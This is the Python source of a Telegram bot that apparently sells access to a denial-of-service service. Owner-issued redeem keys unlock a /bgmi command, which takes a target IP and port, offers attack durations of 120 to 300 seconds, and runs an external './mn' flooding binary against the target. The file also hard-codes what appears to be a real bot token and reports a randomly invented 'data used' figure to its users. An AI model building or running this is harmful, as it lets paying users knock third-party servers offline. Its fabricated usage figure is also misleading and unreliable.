import subprocess
import time
import random
import string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Token and Owner ID (Replace with your new safe token)
BOT_TOKEN = "7312643382:AAFLs8rKbLR7QDXHRUkibrzVMKXf38xbjJw"
OWNER_ID = 5879359815

REDEEM_KEYS = set()
AUTHORIZED_USERS = set()

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to the bot! Please redeem a key to access features.", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """Available Commands:

/bgmi [ip] [port] - Start attack (Requires key redemption)
/genkey - Generate redeem key (Owner only)
/redeem [key] - Redeem key for access
/ping - Check bot speed
/broadcast [message] - Owner only
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = await update.message.reply_text("Pinging...")
    latency = (message.date - update.message.date).total_seconds() * 1000
    await message.edit_text(f"Bot speed: {int(latency)} ms")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Only owner can generate keys.")
        return
    key = generate_key()
    REDEEM_KEYS.add(key)
    await update.message.reply_text(f"Generated Key: `{key}`", parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Please provide a key to redeem.")
        return
    key = context.args[0]
    if key in REDEEM_KEYS:
        REDEEM_KEYS.remove(key)
        AUTHORIZED_USERS.add(update.effective_user.id)
        await update.message.reply_text("Key redeemed successfully! You now have access.")
    else:
        await update.message.reply_text("Invalid or used key.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Only the owner can broadcast messages.")
        return
    message = ' '.join(context.args)
    await update.message.reply_text(f"BROADCAST:\n{message}")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("You must redeem a key first to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /bgmi [ip] [port]")
        return

    ip, port = context.args
    context.user_data["ip"] = ip
    context.user_data["port"] = port

    keyboard = [
        [InlineKeyboardButton("120 seconds", callback_data="120")],
        [InlineKeyboardButton("180 seconds", callback_data="180")],
        [InlineKeyboardButton("250 seconds", callback_data="250")],
        [InlineKeyboardButton("300 seconds", callback_data="300")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select the attack duration:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    if user_id != OWNER_ID and user_id not in AUTHORIZED_USERS:
        await query.edit_message_text("You must redeem a key first to use this feature.")
        return

    selected_time = int(query.data)
    ip = context.user_data.get("ip")
    port = context.user_data.get("port")

    if not ip or not port:
        await query.edit_message_text("No IP or Port set. Please use /bgmi again.")
        return

    await query.edit_message_text(text=f"**Attack started for {selected_time} seconds!**", parse_mode=ParseMode.MARKDOWN)

    try:
        proc = subprocess.Popen(["./mn", ip, port, str(selected_time), "1650"])
        proc.wait()

        data_used = random.randint(50, 200)
        await query.message.reply_text(f"**Attack finished!**\nData used: {data_used} MB", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await query.message.reply_text(f"Error during attack: {e}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is running...")
    app.run_polling()